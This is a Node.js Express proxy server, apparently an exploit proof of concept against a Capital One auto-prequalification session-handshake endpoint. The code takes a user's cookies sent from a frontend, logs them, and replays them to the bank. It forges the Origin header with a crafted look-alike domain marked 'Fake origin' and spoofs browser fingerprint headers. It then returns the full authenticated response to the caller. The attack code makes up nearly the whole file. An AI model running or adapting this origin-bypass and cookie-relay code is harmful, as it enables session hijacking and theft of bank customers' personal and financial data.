const express = require('express');
const fetch = require('node-fetch');
const zlib = require('zlib');  // Import zlib for gzip decompression
const cors = require('cors');  // Import the CORS middleware
const app = express();

app.use(cors());  // Enable CORS for all routes
app.use(express.json());

// Proxy route to forward requests with modified Origin header and user cookies
app.post('/proxy', (req, res) => {
  const { userCookies } = req.body;  // Get user's cookies from frontend
  
  // Define target URL for session-handshake
  const targetUrl = 'https://coaf-prequalification.capitalone.com/protected/476043/auto/application/session-handshake';
  
  // Log the cookies received from the frontend
  console.log('Cookies received from frontend:', userCookies);

  // Define request options (headers, method, etc.)
  const requestOptions = {
    method: 'POST',  // Change to POST for session-handshake request
    headers: {
      'Origin': 'https://chinamayjoshi.xyz?#xyz.capitalone.com',  // Fake origin
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',
      'Accept': 'application/json;v=1',  // Accept JSON format
      'Content-Type': 'application/json',  // Define content type as JSON
      'Cookie': userCookies,  // Include user's cookies dynamically
      'Referer': 'https://coaf-prequalification.capitalone.com/',
      'Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"',
      'Sec-Ch-Ua-Platform': 'Windows',
      'Sec-Ch-Ua-Mobile': '?0',
    },
    credentials: 'include',  // Include cookies if needed
    body: JSON.stringify({
      abTestSchemas: [
        {
          abTestName: 'Universal Identity',
          abTestVariation: 'a',
          abTestVariationName: 'universal-identity-disabled'
        }
      ]
    })  // Add body for the POST request
  };

  // Log the full request headers before sending
  console.log('Sending POST request to Capital One:', targetUrl);
  console.log('Request Headers:', JSON.stringify(requestOptions.headers, null, 2));

  fetch(targetUrl, requestOptions)
    .then(async response => {
      const statusCode = response.status;  // Log the response status code
      console.log(`Response Status Code: ${statusCode}`);

      const headers = response.headers.raw();
      console.log('Response headers:', headers);

      // Step 1: Log raw response buffer (before any decompression or conversion)
      const buffer = await response.buffer();
      console.log('Raw response buffer (hex):', buffer.toString('hex'));  // Log the full buffer as hex
      console.log('Raw response buffer (string):', buffer.toString('utf8'));  // Log the full buffer as a string (UTF-8)

      // Step 2: Check if response is compressed and handle decompression if necessary
      const encoding = response.headers.get('content-encoding');
      let body;

      try {
        if (encoding === 'gzip') {
          console.log('Response is gzip encoded, attempting to decompress...');
          body = zlib.gunzipSync(buffer).toString();
          console.log('Decompressed response body (gzip):', body);
        } else if (encoding === 'deflate') {
          console.log('Response is deflate encoded, attempting to decompress...');
          body = zlib.inflateSync(buffer).toString();
          console.log('Decompressed response body (deflate):', body);
        } else {
          console.log('Response is not compressed, using raw buffer as string...');
          body = buffer.toString();
        }
      } catch (err) {
        // Step 3: Log detailed error if decompression fails
        console.error('Error decompressing data:', err);
        body = 'Error decompressing response';
      }

      // Step 4: Log and send both headers and body back to the frontend
      console.log('Final response body:', body);
      res.json({
        status: statusCode,
        headers: headers,
        body: body
      });
    })
    .catch(error => {
      // Step 5: Log any error that occurs during the fetch process
      console.error('Error fetching data from Capital One:', error);
      res.status(500).json({ error: error.message });
    });
});

// Start the server
app.listen(8080, () => {
  console.log('Proxy server running on port 8080');
});
